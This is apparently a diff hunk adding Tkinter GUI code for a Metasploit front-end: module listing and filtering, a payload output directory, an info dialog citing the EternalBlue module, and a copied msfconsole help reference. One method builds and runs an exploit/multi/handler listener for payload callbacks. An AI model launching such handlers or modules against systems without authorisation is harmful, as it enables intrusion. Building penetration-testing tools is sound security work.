+                self.metasploit_all_modules = unique_modules
+                
+                # Update UI in main thread
+                def update_ui():
+                    # Clear list first
+                    self.metasploit_modules_list.delete(0, tk.END)
+                    # Add all modules
+                    for module in unique_modules:
+                        self.metasploit_modules_list.insert(tk.END, module)
+                    self.metasploit_modules_loaded = True
+                    self.append_metasploit_output(f"✓ Loaded {len(unique_modules)} modules successfully!\n")
+                    self.append_metasploit_output("Modules are now available in the list above.\n")
+                    self.append_metasploit_output("Use the filter to search for specific modules.\n")
+                    if hasattr(self, 'load_modules_btn'):
+                        self.load_modules_btn.config(state="normal")
+                    # Refresh filter to show all modules
+                    if hasattr(self, 'metasploit_module_filter'):
+                        self.filter_metasploit_modules(None)
+                
+                self.root.after(0, update_ui)
+                
+            except Exception as e:
+                def show_error():
+                    self.append_metasploit_output(f"Error loading modules: {str(e)}\n")
+                    self.append_metasploit_output("You can use the 'search' command in the console instead.\n")
+                    if hasattr(self, 'load_modules_btn'):
+                        self.load_modules_btn.config(state="normal")
+                self.root.after(0, show_error)
+        
+        # Load in background thread
+        threading.Thread(target=load_in_thread, daemon=True).start()
+    
+    def browse_payload_directory(self):
+        """Browse for payload output directory."""
+        directory = filedialog.askdirectory(
+            initialdir=self.metasploit_output_dir.get(),
+            title="Select Payload Output Directory"
+        )
+        if directory:
+            self.metasploit_output_dir.set(directory)
+    
+    def select_metasploit_module(self, event):
+        """Select a module from the list (single click)."""
+        selection = self.metasploit_modules_list.curselection()
+        if selection:
+            module = self.metasploit_modules_list.get(selection[0])
+            self.metasploit_selected_module = module
+            self.use_module_btn.config(state="normal")
+            # Show module info in console
+            self.append_metasploit_output(f"Selected: {module}\n")
+    
+    def use_selected_metasploit_module(self):
+        """Use the currently selected module."""
+        if self.metasploit_selected_module:
+            self.use_metasploit_module_direct(self.metasploit_selected_module)
+    
+    def use_metasploit_module(self, event):
+        """Use a module from the list (double-click)."""
+        selection = self.metasploit_modules_list.curselection()
+        if selection:
+            module = self.metasploit_modules_list.get(selection[0])
+            self.use_metasploit_module_direct(module)
+    
+    def use_metasploit_module_direct(self, module):
+        """Use a module directly."""
+        # Insert 'use' command
+        self.metasploit_cmd_var.set(f"use {module}")
+        self.append_metasploit_output(f"Using module: {module}\n")
+        # Execute the command
+        self.execute_metasploit_command()
+        # Focus on command entry
+        self.root.after(100, lambda: self.root.focus_set())
+    
+    def filter_metasploit_modules(self, event):
+        """Filter modules based on search text and type."""
+        if not hasattr(self, 'metasploit_all_modules') or not self.metasploit_all_modules:
+            return
+        
+        filter_text = self.metasploit_module_filter.get().lower() if hasattr(self, 'metasploit_module_filter') else ""
+        filter_type = self.metasploit_module_type.get().lower() if hasattr(self, 'metasploit_module_type') else "all"
+        
+        # Clear current list
+        self.metasploit_modules_list.delete(0, tk.END)
+        
+        # Filter modules
+        filtered = []
+        for module in self.metasploit_all_modules:
+            # Type filter
+            if filter_type != "all":
+                # Handle plural forms
+                type_prefix = filter_type.rstrip('s') + "/"
+                if not module.startswith(type_prefix):
+                    continue
+            
+            # Text filter
+            if filter_text and filter_text not in module.lower():
+                continue
+            
+            filtered.append(module)
+        
+        # Add filtered modules
+        for module in filtered:
+            self.metasploit_modules_list.insert(tk.END, module)
+        
+        # Update status in console (only if filtering)
+        if (filter_text or filter_type != "all") and len(filtered) != len(self.metasploit_all_modules):
+            self.append_metasploit_output(f"Showing {len(filtered)} of {len(self.metasploit_all_modules)} modules\n")
+    
+    def setup_metasploit_handler(self):
+        """Setup a Metasploit handler for the generated payload."""
+        payload_type = self.metasploit_payload_type.get()
+        lhost = self.metasploit_lhost_var.get().strip()
+        lport = self.metasploit_lport_var.get().strip()
+        
+        if not lhost:
+            messagebox.showwarning("Handler", "Please enter LHOST (your IP address).")
+            return
+        
+        if not lport:
+            messagebox.showwarning("Handler", "Please enter LPORT.")
+            return
+        
+        # Determine handler type based on payload
+        if 'http' in payload_type or 'https' in payload_type:
+            handler_cmd = f"use exploit/multi/handler\nset payload {payload_type}\nset LHOST {lhost}\nset LPORT {lport}\nexploit -j"
+        else:
+            handler_cmd = f"use exploit/multi/handler\nset payload {payload_type}\nset LHOST {lhost}\nset LPORT {lport}\nexploit -j"
+        
+        self.append_metasploit_output(f"Setting up handler for {payload_type}...\n")
+        self.append_metasploit_output(f"Handler command:\n{handler_cmd}\n")
+        
+        # Execute handler setup
+        try:
+            result = subprocess.run(['msfconsole', '-q', '-x', handler_cmd + '; exit'],
+                                  capture_output=True, text=True, timeout=30)
+            self.append_metasploit_output(result.stdout)
+            if result.stderr:
+                self.append_metasploit_output(f"Error: {result.stderr}\n")
+            else:
+                self.append_metasploit_output("Handler started in background (use 'jobs' to see it).\n")
+        except subprocess.TimeoutExpired:
+            self.append_metasploit_output("Handler setup timed out.\n")
+        except Exception as e:
+            self.append_metasploit_output(f"Error: {str(e)}\n")
+    
+    def show_info_dialog(self):
+        """Show dialog to input module name(s) for info command."""
+        dialog = tk.Toplevel(self.root)
+        dialog.title("Metasploit Info Command")
+        dialog.transient(self.root)
+        dialog.grab_set()
+        
+        # Center dialog on same monitor as main window
+        dialog.update_idletasks()
+        main_x = self.root.winfo_x()
+        main_y = self.root.winfo_y()
+        main_width = self.root.winfo_width()
+        main_height = self.root.winfo_height()
+        
+        dialog_width = 500
+        dialog_height = 200
+        dialog_x = main_x + (main_width // 2) - (dialog_width // 2)
+        dialog_y = main_y + (main_height // 2) - (dialog_height // 2)
+        
+        # Ensure dialog stays on screen
+        screen_width = self.root.winfo_screenwidth()
+        screen_height = self.root.winfo_screenheight()
+        dialog_x = max(0, min(dialog_x, screen_width - dialog_width))
+        dialog_y = max(0, min(dialog_y, screen_height - dialog_height))
+        
+        dialog.geometry(f"{dialog_width}x{dialog_height}+{dialog_x}+{dialog_y}")
+        
+        # Content
+        content_frame = ttk.Frame(dialog, padding="10")
+        content_frame.pack(fill=tk.BOTH, expand=True)
+        
+        ttk.Label(content_frame, text="Module Name(s):", font=("Segoe UI", 9)).pack(anchor=tk.W, pady=(0, 5))
+        ttk.Label(content_frame, 
+                 text="Enter one or more module names (space-separated)\nExample: exploit/windows/smb/ms17_010_eternalblue",
+                 font=("Segoe UI", 8), foreground="#666666").pack(anchor=tk.W, pady=(0, 10))
+        
+        module_var = tk.StringVar()
+        module_entry = ttk.Entry(content_frame, textvariable=module_var, font=("Consolas", 9), width=60)
+        module_entry.pack(fill=tk.X, pady=(0, 10))
+        module_entry.focus()
+        
+        # Options
+        options_frame = ttk.Frame(content_frame)
+        options_frame.pack(fill=tk.X, pady=(0, 10))
+        
+        json_var = tk.BooleanVar()
+        json_check = ttk.Checkbutton(options_frame, text="JSON format (-j)", variable=json_var)
+        json_check.pack(side=tk.LEFT, padx=(0, 10))
+        
+        markdown_var = tk.BooleanVar()
+        markdown_check = ttk.Checkbutton(options_frame, text="Markdown/Browser (-d)", variable=markdown_var)
+        markdown_check.pack(side=tk.LEFT)
+        
+        # Buttons
+        btn_frame = ttk.Frame(content_frame)
+        btn_frame.pack(fill=tk.X)
+        
+        def execute_info():
+            module_names = module_var.get().strip()
+            if not module_names:
+                messagebox.showwarning("Info", "Please enter at least one module name.")
+                return
+            
+            # Build info command
+            info_cmd = "info"
+            if json_var.get():
+                info_cmd += " -j"
+            if markdown_var.get():
+                info_cmd += " -d"
+            info_cmd += f" {module_names}"
+            
+            dialog.destroy()
+            self.append_metasploit_output(f"> {info_cmd}\n")
+            
+            # Execute info command
+            try:
+                result = subprocess.run(['msfconsole', '-q', '-x', f'{info_cmd}; exit'],
+                                      capture_output=True, text=True, timeout=45)
+                self.append_metasploit_output(result.stdout)
+                if result.stderr:
+                    self.append_metasploit_output(f"Error: {result.stderr}\n")
+            except subprocess.TimeoutExpired:
+                self.append_metasploit_output("Info command timed out.\n")
+            except Exception as e:
+                self.append_metasploit_output(f"Error: {str(e)}\n")
+        
+        ttk.Button(btn_frame, text="Execute", command=execute_info).pack(side=tk.RIGHT, padx=(5, 0))
+        ttk.Button(btn_frame, text="Cancel", command=dialog.destroy).pack(side=tk.RIGHT)
+        
+        # Bind Enter key
+        module_entry.bind('<Return>', lambda e: execute_info())
+        dialog.bind('<Escape>', lambda e: dialog.destroy())
+    
+    def execute_quick_command(self, command):
+        """Execute a quick command."""
+        self.metasploit_cmd_var.set(command)
+        self.execute_metasploit_command()
+    
+    def create_metasploit_help_tab(self, parent):
+        """Create the Metasploit Help tab with command reference."""
+        # Create scrollable text widget for help content
+        help_text = scrolledtext.ScrolledText(parent, 
+                                             font=("Consolas", 9),
+                                             bg="#ffffff",
+                                             fg="#000000",
+                                             wrap=tk.WORD,
+                                             padx=10,
+                                             pady=10)
+        help_text.pack(fill=tk.BOTH, expand=True)
+        
+        # Help content
+        help_content = """Core Commands
+=============
+
+Command           Description
+-------           -----------
+?                 Help menu
+banner            Display an awesome metasploit banner
+cd                Change the current working directory
+color             Toggle color
+connect           Communicate with a host
+debug             Display information useful for debugging
+exit              Exit the console
+features          Display the list of not yet released features that can be opted in to
+get               Gets the value of a context-specific variable
+getg              Gets the value of a global variable
+grep              Grep the output of another command
+help              Help menu
+history           Show command history
+load              Load a framework plugin
+quit              Exit the console
+repeat            Repeat a list of commands
+route             Route traffic through a session
+save              Saves the active datastores
+sessions          Dump session listings and display information about sessions
+set               Sets a context-specific variable to a value
+setg              Sets a global variable to a value
+sleep             Do nothing for the specified number of seconds
+spool             Write console output into a file as well the screen
+threads           View and manipulate background threads
+tips              Show a list of useful productivity tips
+unload            Unload a framework plugin
+unset             Unsets one or more context-specific variables
+unsetg            Unsets one or more global variables
+version           Show the framework and console library version numbers
+
+
+Module Commands
+===============
+
+Command           Description
+-------           -----------
+advanced          Displays advanced options for one or more modules
+back              Move back from the current context
+clearm            Clear the module stack
+favorite          Add module(s) to the list of favorite modules
+favorites         Print the list of favorite modules (alias for `show favorites`)
+info              Displays information about one or more modules
+listm             List the module stack
+loadpath          Searches for and loads modules from a path
+options           Displays global options or for one or more modules
+popm              Pops the latest module off the stack and makes it active
+previous          Sets the previously loaded module as the current module
+pushm             Pushes the active or list of modules onto the module stack
+reload_all        Reloads all modules from all defined module paths
+search            Searches module names and descriptions
+show              Displays modules of a given type, or all modules
+use               Interact with a module by name or search term/index
+
+
+Job Commands
+============
+
+Command           Description
+-------           -----------
+handler           Start a payload handler as job
+jobs              Displays and manages jobs
+kill              Kill a job
+rename_job        Rename a job
+
+
+Resource Script Commands
+========================
+
+Command           Description
+-------           -----------
+makerc            Save commands entered since start to a file
+resource          Run the commands stored in a file
+
+
+Database Backend Commands
+=========================
+
+Command           Description
+-------           -----------
+analyze           Analyze database information about a specific address or address range
+certs             List Pkcs12 certificate bundles in the database
+db_connect        Connect to an existing data service
+db_disconnect     Disconnect from the current data service
+db_export         Export a file containing the contents of the database
+db_import         Import a scan result file (filetype will be auto-detected)
+db_nmap           Executes nmap and records the output automatically
+db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
+db_remove         Remove the saved data service entry
+db_save           Save the current data service connection as the default to reconnect on startup
+db_stats          Show statistics for the database
+db_status         Show the current data service status
+hosts             List all hosts in the database
+klist             List Kerberos tickets in the database
+loot              List all loot in the database
+notes             List all notes in the database
+services          List all services in the database
+vulns             List all vulnerabilities in the database
+workspace         Switch between database workspaces
+
+
+Credentials Backend Commands
+============================
+
+Command           Description
+-------           -----------
+creds             List all credentials in the database
+
+
+Developer Commands
+==================
+
+Command           Description
+-------           -----------
+edit              Edit the current module or a file with the preferred editor
+irb               Open an interactive Ruby shell in the current context
+log               Display framework.log paged to the end if possible
+pry               Open the Pry debugger on the current module or Framework
+reload_lib        Reload Ruby library files from specified paths
+time              Time how long it takes to run a particular command
+
+
+DNS Commands
+============
+
+Command           Description
+-------           -----------
+dns               Manage Metasploit's DNS resolving behaviour
+
+
+For more info on a specific command, use <command> -h or help <command>.
+
+
+msfconsole
+==========
+
+`msfconsole` is the primary interface to Metasploit Framework. There is quite a
+lot that needs go here, please be patient and keep an eye on this space!
+
+
+Building ranges and lists
+-------------------------
+
+Many commands and options that take a list of things can use ranges to avoid
+having to manually list each desired thing. All ranges are inclusive.
+
+
+### Ranges of IDs
+
+Commands that take a list of IDs can use ranges to help. Individual IDs must be
+separated by a `,` (no space allowed) and ranges can be expressed with either
+`-` or `..`.
+
+
+### Ranges of IPs
+
+There are several ways to specify ranges of IP addresses that can be mixed
+together. The first way is a list of IPs separated by just a ` ` (ASCII space),
+with an optional `,`. The next way is two complete IP addresses in the form of
+`BEGINNING_ADDRESS-END_ADDRESS` like `127.0.1.44-127.0.2.33`. CIDR
+specifications may also be used, however the whole address must be given to
+Metasploit like `127.0.0.0/8` and not `127/8`, contrary to the RFC.
+Additionally, a netmask can be used in conjunction with a domain name to
+dynamically resolve which block to target. All these methods work for both IPv4
+and IPv6 addresses. IPv4 addresses can also be specified with special octet
+ranges from the [NMAP target
+specification](https://nmap.org/book/man-target-specification.html)
+
+
+### Examples
+
+Terminate the first sessions:
+
+    sessions -k 1
+
+Stop some extra running jobs:
+
+    jobs -k 2-6,7,8,11..15
+
+Check a set of IP addresses:
+
+    check 127.168.0.0/16, 127.0.0-2.1-4,15 127.0.0.255
+
+Target a set of IPv6 hosts:
+
+    set RHOSTS fe80::3990:0000/110, ::1-::f0f0
+
+Target a block from a resolved domain name:
+
+    set RHOSTS www.example.test/24
+"""
+        
+        # Insert help content
+        help_text.insert(tk.END, help_content)
+        
+        # Make text read-only
+        help_text.config(state=tk.DISABLED)
+    
+    def append_metasploit_output(self, text):
+        """Append text to Metasploit console output."""
+        self.metasploit_console.insert(tk.END, text)
+        self.metasploit_console.see(tk.END)
+        self.root.update_idletasks()
 
 
 def main():
